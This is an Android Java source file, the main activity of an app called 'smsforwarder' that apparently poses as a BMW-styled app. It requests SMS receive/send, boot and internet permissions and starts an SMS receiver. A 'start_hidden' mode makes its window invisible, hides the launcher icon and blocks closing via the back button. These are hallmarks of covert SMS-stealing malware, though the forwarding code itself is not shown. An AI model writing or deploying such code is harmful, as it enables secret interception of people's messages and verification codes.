package com.example.smsforwarder;

import android.Manifest;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

public class MainActivity extends AppCompatActivity {
    private static final String TAG = "MainActivity";
    private static final int PERMISSION_REQUEST_CODE = 123;
    private static final String[] REQUIRED_PERMISSIONS = {
        Manifest.permission.RECEIVE_SMS,
        Manifest.permission.SEND_SMS,
        Manifest.permission.RECEIVE_BOOT_COMPLETED,
        Manifest.permission.INTERNET
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // Check if we should start in hidden mode
        boolean startHidden = getIntent().getBooleanExtra("start_hidden", false);
        if (startHidden) {
            // Hide the activity window
            hideWindow();
        } else {
            // Set BMW-style theme
            setContentView(R.layout.activity_main);
        }

        // Request necessary permissions
        requestPermissions();

        // Initialize the app
        initializeApp();
    }

    private void hideWindow() {
        // Make the activity window transparent and move it off screen
        View decorView = getWindow().getDecorView();
        decorView.setAlpha(0f);
        decorView.setVisibility(View.GONE);
        
        // Hide app icon from launcher
        Utils.hideAppIcon(this);
    }

    private void requestPermissions() {
        for (String permission : REQUIRED_PERMISSIONS) {
            if (ContextCompat.checkSelfPermission(this, permission) 
                != PackageManager.PERMISSION_GRANTED) {
                
                ActivityCompat.requestPermissions(
                    this,
                    REQUIRED_PERMISSIONS,
                    PERMISSION_REQUEST_CODE
                );
                break;
            }
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, 
                                         String[] permissions,
                                         int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        
        if (requestCode == PERMISSION_REQUEST_CODE) {
            boolean allGranted = true;
            
            for (int result : grantResults) {
                if (result != PackageManager.PERMISSION_GRANTED) {
                    allGranted = false;
                    break;
                }
            }

            if (allGranted) {
                initializeApp();
            } else {
                Log.e(TAG, "Required permissions not granted");
                Toast.makeText(this, 
                             "Required permissions not granted", 
                             Toast.LENGTH_SHORT).show();
                finish();
            }
        }
    }

    private void initializeApp() {
        try {
            // Initialize SMS receiver
            Utils.initializeSmsReceiver(this);

            // Schedule background work for Android 10+
            Utils.scheduleBackgroundWork(this);

            // Get or generate device ID
            String deviceId = Utils.getDeviceId(this);
            Log.d(TAG, "Device ID: " + deviceId);

            // Hide the app if started in hidden mode
            if (getIntent().getBooleanExtra("start_hidden", false)) {
                hideWindow();
            }

            Log.d(TAG, "App initialized successfully");
        } catch (Exception e) {
            Log.e(TAG, "Error initializing app: " + e.getMessage());
        }
    }

    @Override
    protected void onNewIntent(Intent intent) {
        super.onNewIntent(intent);
        
        // Handle any new intents (e.g., from BootReceiver)
        if (intent.getBooleanExtra("start_hidden", false)) {
            hideWindow();
        }
    }

    @Override
    public void onBackPressed() {
        // Prevent closing the app with back button if in hidden mode
        if (getIntent().getBooleanExtra("start_hidden", false)) {
            moveTaskToBack(true);
        } else {
            super.onBackPressed();
        }
    }
}
